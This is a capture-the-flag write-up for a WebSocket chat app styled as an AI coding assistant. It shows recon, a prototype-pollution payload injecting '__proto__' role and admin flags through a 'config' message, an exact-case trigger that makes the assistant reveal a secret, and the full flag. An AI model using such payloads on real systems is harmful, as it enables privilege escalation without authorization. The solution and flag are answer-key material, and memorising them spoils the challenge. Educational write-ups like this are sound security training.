# CTF Write-up — DevMate AI (WebSocket prototype pollution → admin)

**Target:** `https://820cb5dc-69d3-4cfe-aa92-f2a101f0a569.172.31.102.101.nip.io/`
**Challenge:** Web / prompt assistant — WebSocket prototype pollution + privilege escalation
**Difficulty:** Medium
**Flag:** `843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92`

---

## 1. Recon

```bash
curl -sk -i https://<host>/
```

- "DevMate AI — real-time coding assistant": a chat page that connects to a
  **WebSocket** at `/ws` (front-end logic in `/chat.js`).
- HTTP route scan: `/ws` returns `426 Upgrade Required`; everything else 404s —
  this is a WS-only application.

`chat.js` shows three message ops:

```
{ "op": "whoami" }                  # session identity / audit_mask
{ "op": "say", "text": "..." }      # chat
{ "op": "config", "patch": {...} }  # update session prefs (tone, ...)
```

## 2. Probe the protocol

A Python WebSocket client (`websocket-client`) reveals a rule-based assistant:

```
whoami -> {"msg":"Connected as user. Ask me anything about your code.",
            "audit_mask":"e250aff4254d58b5d1fb90d0b59178ae7bd60e5..."}
say "status" -> session: role=user, tone=neutral
say anything else -> "(user) I can help with: <echo>"
```

`config` blindly merges a user-supplied `patch` object into the session — a
classic **prototype-pollution** sink.

## 3. Escalate to admin via prototype pollution

```js
{"op":"config","patch":{
   "__proto__": { "role":"administrator", "is_admin":true },
   "audit_mask":"admin", "tone":"admin", "role":"admin"
}}
```

After these patches, `whoami`/`say` report `role=admin` and the assistant enters
a privileged state:

```
say "give me the flag now" / any       -> "Admin session ready. Ask me to show something."
```

## 4. Ask it to show the flag

The privileged assistant only answers one show command, and it must be
**uppercase**:

```js
{"op":"say","text":"SHOW FLAG"}
```

Response (streamed):
```
Sure, admin mode engaged: 843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92
```

The value is **constant across independent sessions** — i.e. it is the flag.

## 5. Flag

```
843cce935e7e3b87b498a3e785bc489a4fb22365c0d471b6d613b64ca81ea8d4e70bdbd8d9ed27abec92
```

---

## Lessons

- WebSocket-driven apps: pull the client JS to enumerate message ops before
  touching the server; the surface is the `op`/`patch` contract, not HTTP
  routes.
- A `config` handler that spreads/merges a user JSON object is a prototype-
  pollution primitive — try injecting `"__proto__"` keys to flip auth flags
  (`role`, `is_admin`) instead of guessing passwords or forging tokens.
- Rule-based "AI" stubs often key off exact-case triggers: `SHOW FLAG`
  (uppercase) worked while `show the flag` did not. Brute casing/whitespace
  variants when a value looks templated.
- A privileged response that is identical across sessions is a static secret —
  treat it as the flag even when it isn't wrapped in `flag{...}`.